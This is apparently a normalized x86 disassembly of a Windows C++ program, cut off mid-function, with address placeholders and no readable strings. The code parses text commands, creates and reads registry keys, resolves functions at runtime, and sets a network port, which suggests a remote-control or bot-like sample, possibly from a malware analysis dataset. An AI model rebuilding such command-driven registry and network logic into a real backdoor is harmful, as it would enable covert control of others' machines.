call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x13 ]
lea ecx [ ebp - 0xb4 ]
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x11 ]
lea ecx [ ebp - 0x84 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x29d8 ]
push [ ebp - 0x18 ]
lea ecx [ ebp - 0xa4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0xc4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4094de
push ebp
mov ebp esp
push esi
mov esi [ std::operator==@IAT ]
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000002
jmp r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000001
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
jmp r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000000
jmp r-xdata
pop esi
pop ebp
retn
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000003
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi 0x80000005
sub_409577
push ebp
mov ebp esp
sub esp 0x94
push ebx
push esi
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4094de
add esp 0x10
lea ecx [ ebp - 0x4 ]
xor ebx ebx
push ecx
push 0x20019
push ebx
push [ ebp + 0x18 ]
push eax
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x14 ]
mov esi esp
push r--data
push rw-data
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x4 ]
call sub_40926a
cmp [ ebp + 0x1c ] bl
pop ecx
mov ecx r--data
je r-xdata
sub esp 0x10
mov eax rw-data
mov esi esp
push rw-data
push eax
push rw-data
push eax
push rw-data
push eax
push rw-data
push eax
push ecx
push eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x94 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x84 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi r--data
mov ecx rw-data
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov bl 0x1
jmp r-xdata
mov ecx r--data
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop esi
pop ebx
leave
retn
sub_40976b
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
mov esi rw-data
sub esp 0x10
mov ecx esp
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_40efb5
add esp 0x24
xor ebx ebx
lea ecx [ ebp - 0x14 ]
push ebx
call sub_401289
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi [ std::operator==@IAT ]
lea eax [ ebp - 0x24 ]
push r--data
push eax
call edi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x24 ]
push r--data
push eax
call edi
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4012b5
cmp eax 0x2
jbe r-xdata
lea eax [ ebp - 0x24 ]
push r--data
push eax
call edi
pop ecx
test al al
pop ecx
je r-xdata
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4094de
add esp 0x10
push eax
call sub_409132
add esp 0xc
cmp al bl
je r-xdata
push 0x1
push ebx
jmp r-xdata
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
call edi
pop ecx
test al al
pop ecx
je r-xdata
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
push 0x2
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] eax
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4094de
add esp 0x10
push eax
call [ rw-data ]
cmp eax ebx
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_409577
add esp 0x18
jmp r-xdata
lea eax [ ebp - 0x24 ]
push r--data
push eax
call edi
pop ecx
test al al
pop ecx
je r-xdata
push 0x4
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
cmp eax 0x4
pop ecx
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
jmp r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x14 ]
push [ eax ]
push 0x5c
push 0x2
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find_last_of@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call sub_401b3c
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x20006
push ebx
push ebx
push ebx
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4094de
add esp 0x10
push eax
call [ RegCreateKeyExA@IAT ]
push [ ebp - 0x4 ]
mov edi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
push 0x5
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push [ eax ]
lea ecx [ ebp - 0x14 ]
push 0x3
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4094de
add esp 0x10
push eax
call sub_409046
add esp 0x10
cmp eax 0xb
je r-xdata
push eax
lea eax [ ebp - 0x34 ]
push ebx
push eax
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
lea ecx [ ebp - 0x34 ]
mov edi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor edi edi
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x14 ]
push [ eax ]
push 0x5c
push 0x2
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find_last_of@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
push 0x5
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push [ eax + 0x4 ]
lea ecx [ ebp - 0x14 ]
push [ eax ]
push 0x3
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4094de
add esp 0x10
push eax
call sub_40908b
add esp 0x14
jmp r-xdata
push eax
push 0x5
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4094de
add esp 0x10
push eax
call sub_408fda
add esp 0x20
jmp r-xdata
push ebx
push edi
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_409577
pop ecx
lea eax [ ebp - 0x34 ]
pop ecx
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x34 ]
push ebx
push eax
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
lea ecx [ ebp - 0x34 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
jmp r-xdata
cmp al bl
je r-xdata
push ebx
push esi
jmp r-xdata
sub_409d91
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_402109
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402168
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov esi esp
push eax
push rw-data
lea eax [ ebp - 0x10 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
call sub_402198
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
push sub_40976b
mov ecx ebx
call sub_40221c
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_409e73
push ebp
mov ebp esp
sub esp 0x334
push ebx
push esi
mov esi rw-data
push edi
push 0x29
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
mov ecx esi
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x84 ]
push eax
call sub_40efb5
add esp 0x24
and [ ebp - 0x8 ] 0x0
mov ebx rw-data
lea eax [ ebp - 0x3c ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2e ]
push eax
lea ecx [ ebp - 0x2c ]
movzx eax [ ebp - 0x30 ]
push eax
movzx eax [ ebp - 0x32 ]
push eax
movzx eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc [ ebp - 0x8 ]
lea ecx [ ebp - 0x84 ]
call sub_4012b5
cmp [ ebp - 0x8 ] eax
jb r-xdata
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
mov edi rw-data
push 0x1
mov esi [ eax ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
push eax
call htons
lea ecx [ ebp - 0x1c ]
mov [ rw-data ] ax
call sub_4012b5
cmp eax 0x2
jbe r-xdata
lea ecx [ ebp - 0x1c ]
call sub_401b3c
jmp r-xdata
and [ ebp - 0x8 ] 0x0
push 0x2
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
imul eax eax 0x3e8
pop ecx
push eax
call [ Sleep@IAT ]
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x2
lea ecx [ ebp - 0x1c ]
call sub_401289
mov esi rw-data
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx rw-data
call sub_402906
jmp r-xdata
mov ecx rw-data
call sub_402109
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x84 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
